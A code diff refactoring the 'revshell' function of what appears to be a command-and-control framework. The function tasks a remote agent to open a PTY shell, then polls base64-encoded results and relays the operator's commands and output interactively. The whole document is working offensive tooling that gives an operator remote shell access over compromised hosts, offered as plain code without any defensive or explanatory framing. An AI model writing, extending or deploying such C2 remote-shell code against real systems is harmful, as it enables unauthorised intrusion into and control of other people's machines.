@@ -9,41 +9,42 @@ def strip_ansi(text):
     return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)
 
 
-def revshell(manager, agent_id, c2_server):
-    print(f"{Fore.CYAN}[*] Starting PTY shell (old C2 method){Style.RESET_ALL}")
-    print(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}")
-    print()
+def _write(data):
+    sys.stdout.write(data)
+    sys.stdout.flush()
 
-    # Send SHELL: to init PTY on agent
+
+def revshell(manager, agent_id, c2_server):
+    _write(f"{Fore.CYAN}[*] Starting PTY shell{Style.RESET_ALL}\n")
+    _write(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}\n\n")
+
     tid = manager.send_task(agent_id, "SHELL:", {})
     if not tid:
-        print("[!] Agent not found")
+        _write("[!] Agent not found\n")
         return
 
-    # Wait for SHELL:ready response
     ready = False
     for _ in range(20):
         time.sleep(0.5)
-        results = manager.get_results(agent_id)
-        for r in results:
+        for r in manager.consume_results(agent_id):
             out = r.get("output", "")
             if out.startswith("SHELL:ready:"):
                 data = strip_ansi(base64.b64decode(out[11:]).decode(errors="replace"))
-                sys.stdout.write(data)
-                sys.stdout.flush()
+                _write(data)
                 ready = True
                 break
         if ready:
             break
+
     if not ready:
-        print("[!] Shell failed to start")
+        _write("[!] Shell failed to start\n")
         return
 
     while True:
         try:
             cmd = input()
         except (EOFError, KeyboardInterrupt):
-            print()
+            _write("\n")
             break
 
         if cmd.strip() in ("exit", "quit"):
@@ -56,29 +57,26 @@ def revshell(manager, agent_id, c2_server):
         if not tid:
             break
 
-        # Poll for result and drain output
-        got_output = False
         for _ in range(30):
             time.sleep(0.3)
-            results = manager.get_results(agent_id)
-            for r in results:
+            for r in manager.consume_results(agent_id):
                 out = r.get("output", "")
                 if r.get("task_id") == tid:
                     try:
-                        data = strip_ansi(base64.b64decode(out).decode(errors="replace"))
+                        data = strip_ansi(
+                            base64.b64decode(out).decode(errors="replace")
+                        )
                     except Exception:
                         data = out
-                    sys.stdout.write(data)
-                    sys.stdout.flush()
-                    got_output = True
+                    _write(data)
                 elif out.startswith("SHELL_DRAIN:"):
                     try:
-                        data = strip_ansi(base64.b64decode(out[12:]).decode(errors="replace"))
-                        sys.stdout.write(data)
-                        sys.stdout.flush()
+                        data = strip_ansi(
+                            base64.b64decode(out[12:]).decode(errors="replace")
+                        )
+                        _write(data)
                     except Exception:
                         pass
                 elif out.startswith("SHELL:exited"):
-                    print("\n[+] Shell exited")
+                    _write("\n[+] Shell exited\n")
                     return
-                r["output"] = ""
